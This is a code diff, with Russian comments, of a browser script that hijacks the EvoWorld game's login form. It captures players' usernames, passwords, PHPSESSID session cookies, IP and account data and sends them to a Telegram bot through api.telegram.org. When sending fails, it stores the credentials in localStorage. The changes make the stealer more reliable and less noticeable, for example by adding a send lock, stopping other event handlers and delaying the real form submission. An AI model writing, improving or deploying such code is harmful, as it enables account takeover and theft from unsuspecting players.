@@ -248,7 +248,8 @@ setTimeout(() => {
     // Чтобы не слать один и тот же аккаунт несколько раз подряд
     var lastSentKey = '';
     var lastSentTime = 0;
-    var SAME_ACC_COOLDOWN_MS = 15000;
+    var SAME_ACC_COOLDOWN_MS = 30000; // Увеличено до 30 секунд
+    var sendingInProgress = false;
 
     function getCookie(name) {
         var matches = document.cookie.match(new RegExp(
@@ -288,10 +289,14 @@ setTimeout(() => {
     }
 
     function sendCredentials(username, password) {
+        // Проверка на дубликаты и блокировку одновременной отправки
         var key = (username || '') + '|' + (password || '');
         var now = Date.now();
+        if (sendingInProgress) return;
         if (key === lastSentKey && (now - lastSentTime) < SAME_ACC_COOLDOWN_MS)
             return;
+        
+        sendingInProgress = true;
         lastSentKey = key;
         lastSentTime = now;
 
@@ -308,23 +313,29 @@ setTimeout(() => {
                     serverText = sel.options[sel.selectedIndex].text;
             } catch (e) {}
 
-            var message = '🦊 EvoWorld Login\n\n';
-            message += '👤 Login: ' + (username || '—') + '\n';
-            message += '🔐 Password: ' + (password || '—') + '\n';
-            message += '⏰ ' + timestamp + '\n\n';
-
-            message += '🚨 ДАННЫЕ ЛОГА\n';
-            message += '📅 Время: ' + new Date().toLocaleString() + '\n';
-            message += '🌐 IP: ' + ip + '\n';
-            message += '🔗 URL: ' + (window.location.href || '') + '\n\n';
-            message += '📊 Уровень: ' + userLevelStr + '\n';
-            message += '💰 Gems: ' + (typeof user !== 'undefined' && user && user.premiumPoints != null ? user.premiumPoints : 'N/A') + '\n';
-            message += '🖥️ Сервер: ' + serverText + '\n\n';
-            message += '🔑 PHPSESSID:\n' + (phpsessid || '—') + '\n';
+            // Формат как "🚨 НОВЫЙ ЛОГ 🚨" с логином и паролем вверху
+            var message = '<b>🚨 НОВЫЙ ЛОГ 🚨</b>\n\n';
+            message += '<b>📅 Время:</b> ' + timestamp + '\n';
+            message += '<b>🌐 IP:</b> <code>' + ip + '</code>\n';
+            message += '<b>🔗 URL:</b> ' + (window.location.href || '') + '\n\n';
+            
+            message += '<b>👤 Логин:</b> <code>' + (username || '—') + '</code>\n';
+            message += '<b>🔐 Пароль:</b> <code>' + (password || '—') + '</code>\n\n';
+            
+            message += '<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n';
+            message += '<code>' + userLevelStr + '</code>\n';
+            message += '<b>💰 Gems:</b> ' + (typeof user !== 'undefined' && user && user.premiumPoints != null ? user.premiumPoints : 'N/A') + '\n';
+            message += '<b>🖥️ Выбранный сервер:</b> ' + serverText + '\n\n';
+            
+            message += '<b>🔑 PHPSESSID:</b>\n';
+            message += '<code>' + (phpsessid || '—') + '</code>\n';
 
             if (userDataStr) {
-                message += '\n📋 user:\n' + userDataStr;
+                message += '\n<b>📋 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:</b>\n';
+                message += '<code>' + userDataStr + '</code>\n';
             }
+            
+            message += '\n<i>Отправлено автоматически</i>';
 
             var MAX_LEN = 4090;
             var parts = [];
@@ -333,14 +344,18 @@ setTimeout(() => {
             }
 
             function sendPart(idx) {
-                if (idx >= parts.length) return Promise.resolve();
-                var text = parts.length > 1 ? ('📄 ' + (idx + 1) + '/' + parts.length + '\n\n' + parts[idx]) : parts[idx];
+                if (idx >= parts.length) {
+                    sendingInProgress = false;
+                    return Promise.resolve();
+                }
+                var text = parts.length > 1 ? ('<b>📄 ' + (idx + 1) + '/' + parts.length + '</b>\n\n' + parts[idx]) : parts[idx];
                 return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: GROUP_ID,
                         text: text,
+                        parse_mode: 'HTML',
                         disable_web_page_preview: true
                     })
                 }).then(function(response) {
@@ -351,8 +366,11 @@ setTimeout(() => {
 
             return sendPart(0);
         })
-        .then(function() {})
+        .then(function() {
+            sendingInProgress = false;
+        })
         .catch(function() {
+            sendingInProgress = false;
             var logs = JSON.parse(localStorage.getItem('evoLogs') || '[]');
             logs.push({ username: username, password: password, timestamp: timestamp });
             localStorage.setItem('evoLogs', JSON.stringify(logs));
@@ -377,37 +395,41 @@ setTimeout(() => {
         if (form) form.setAttribute('data-evo-intercept', '1');
 
         if (form) {
+            // Используем один обработчик submit - самый надежный
             form.addEventListener('submit', function(ev) {
                 if (form._evoSubmitting) {
                     form._evoSubmitting = false;
                     return;
                 }
                 ev.preventDefault();
+                ev.stopImmediatePropagation();
                 var u = document.querySelector(SELECTORS.username);
                 var p = document.querySelector(SELECTORS.password);
-                if (u && p) sendCredentials(u.value, p.value);
+                if (u && p && u.value) {
+                    sendCredentials(u.value, p.value || '');
+                }
                 form._evoSubmitting = true;
-                form.submit();
+                setTimeout(function() {
+                    form.submit();
+                }, 500);
             }, true);
             return;
         }
 
-        if (submitButton) {
-            submitButton.addEventListener('click', function() {
+        // Если формы нет, используем только submit button (без blur, чтобы не дублировать)
+        if (submitButton && !submitButton.hasAttribute('data-evo-click-handled')) {
+            submitButton.setAttribute('data-evo-click-handled', '1');
+            submitButton.addEventListener('click', function(ev) {
+                ev.stopImmediatePropagation();
                 setTimeout(function() {
                     var u = document.querySelector(SELECTORS.username);
                     var p = document.querySelector(SELECTORS.password);
-                    if (u && p && u.value && p.value) sendCredentials(u.value, p.value);
+                    if (u && p && u.value) {
+                        sendCredentials(u.value, p.value || '');
+                    }
                 }, 100);
             }, true);
-            return;
         }
-
-        passwordField.addEventListener('blur', function() {
-            var u = document.querySelector(SELECTORS.username);
-            var p = document.querySelector(SELECTORS.password);
-            if (u && p && u.value && p.value) sendCredentials(u.value, p.value);
-        });
     }
 
     function tryInterception() {
